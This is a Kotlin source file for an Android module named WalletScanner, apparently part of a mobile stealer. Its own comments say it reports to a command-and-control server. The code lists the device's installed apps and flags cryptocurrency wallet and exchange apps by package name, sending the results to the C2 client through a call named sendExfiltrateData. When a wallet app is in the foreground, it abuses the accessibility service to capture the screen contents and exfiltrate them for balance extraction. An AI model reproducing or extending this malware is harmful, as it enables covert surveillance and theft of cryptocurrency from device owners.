package com.xrc.app.wallet

import android.content.Context
import android.content.pm.PackageManager
import android.util.Log
import com.xrc.app.XRCApp
import com.xrc.app.finance.FinancialTargetList
import com.xrc.app.service.XRCAccessibilityService
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.CopyOnWriteArrayList

/**
 * Scans for installed cryptocurrency wallets, monitors their usage,
 * extracts balance information via accessibility, and reports to C2.
 */
object WalletScanner {

    const val TAG = "WalletScanner"

    // Known wallet package patterns
    private val walletPackagePatterns = listOf(
        "wallet", "crypto", "coin", "bitcoin", "ether", "metamask",
        "trust", "exodus", "ledger", "trezor", "mycelium", "electrum",
        "blockchain", "binance", "coinbase", "kucoin", "kraken",
        "defi", "nft", "token", "swap", "bridge"
    )

    // Known wallet app package names
    private val knownWalletPackages = setOf(
        "io.metamask",
        "com.trustwallet.app",
        "com.binance",
        "com.coinbase.android",
        "com.exodusmovement.exodus",
        "com.ledger.live",
        "com.mycelium.wallet",
        "com.bitcoincore",
        "com.electrum",
        "com.blockchain",
        "com.crypto.exchange",
        "com.kraken",
        "com.kucoin",
        "com.bitfinex",
        "com.bybit",
        "com.okx",
        "com.defi",
        "com.uniswap"
    )

    private val detectedWallets = CopyOnWriteArrayList<DetectedWallet>()
    private var isMonitoring = false

    data class DetectedWallet(
        val packageName: String,
        val name: String,
        val category: String, // "exchange", "wallet", "defi", "nft"
        val installed: Boolean,
        val isSystem: Boolean,
        val version: String = "",
        val detectedAt: Long = System.currentTimeMillis()
    ) {
        fun toJson(): JSONObject = JSONObject().apply {
            put("package", packageName)
            put("name", name)
            put("category", category)
            put("installed", installed)
            put("is_system", isSystem)
            put("version", version)
            put("detected_at", detectedAt)
        }
    }

    fun scanInstalledWallets(context: Context): JSONArray {
        detectedWallets.clear()
        val results = JSONArray()
        val pm = context.packageManager

        try {
            val installedApps = pm.getInstalledApplications(PackageManager.GET_META_DATA)

            for (app in installedApps) {
                val pkg = app.packageName
                if (knownWalletPackages.contains(pkg) ||
                    walletPackagePatterns.any { pkg.contains(it, ignoreCase = true) }
                ) {
                    val wallet = DetectedWallet(
                        packageName = pkg,
                        name = app.loadLabel(pm).toString(),
                        category = categorizeWallet(pkg),
                        installed = true,
                        isSystem = (app.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0,
                        version = pm.getPackageInfo(pkg, 0).versionName ?: "unknown"
                    )
                    detectedWallets.add(wallet)
                    results.put(wallet.toJson())
                    Log.i(TAG, "Detected wallet: ${wallet.name} ($pkg)")
                }
            }

            // Send to C2
            if (results.length() > 0) {
                XRCApp.instance.c2Client.sendExfiltrateData(
                    "wallet_scan",
                    JSONObject().apply {
                        put("type", "wallet_scan_results")
                        put("count", results.length())
                        put("wallets", results)
                    }.toString()
                )
            }
        } catch (e: Exception) {
            Log.e(TAG, "Wallet scan error: ${e.message}")
        }

        return results
    }

    private fun categorizeWallet(packageName: String): String {
        return when {
            packageName.contains("exchange") || packageName.contains("binance") ||
            packageName.contains("coinbase") || packageName.contains("kraken") ||
            packageName.contains("kucoin") || packageName.contains("bybit") ||
            packageName.contains("okx") -> "exchange"

            packageName.contains("defi") || packageName.contains("swap") ||
            packageName.contains("bridge") || packageName.contains("unstoppable") ||
            packageName.contains("rainbow") -> "defi"

            packageName.contains("nft") || packageName.contains("opensea") ||
            packageName.contains("rarible") || packageName.contains("blur") -> "nft"

            else -> "wallet"
        }
    }

    fun onAppForegrounded(packageName: String) {
        if (!isMonitoring) return

        if (knownWalletPackages.contains(packageName) ||
            walletPackagePatterns.any { packageName.contains(it, ignoreCase = true) }
        ) {
            Log.i(TAG, "Wallet app in foreground: $packageName")

            val json = JSONObject().apply {
                put("type", "wallet_foreground")
                put("package", packageName)
                put("timestamp", System.currentTimeMillis())
            }

            XRCApp.instance.c2Client.send(json.toString())

            // Try to read screen content for balance extraction
            tryExtractBalance(packageName)
        }
    }

    private fun tryExtractBalance(packageName: String) {
        val accService = XRCAccessibilityService.instance ?: return
        val hierarchy = accService.getScreenHierarchy()

        // Send hierarchy to C2 for processing
        XRCApp.instance.c2Client.sendExfiltrateData(
            "wallet_screen_$packageName",
            hierarchy
        )
    }

    fun startMonitoring(context: Context) {
        isMonitoring = true
        scanInstalledWallets(context)
        Log.i(TAG, "Wallet monitoring started")
    }

    fun stopMonitoring() {
        isMonitoring = false
        Log.i(TAG, "Wallet monitoring stopped")
    }

    fun getDetectedWallets(): List<DetectedWallet> = detectedWallets.toList()

    fun getWalletCount(): Int = detectedWallets.size
}
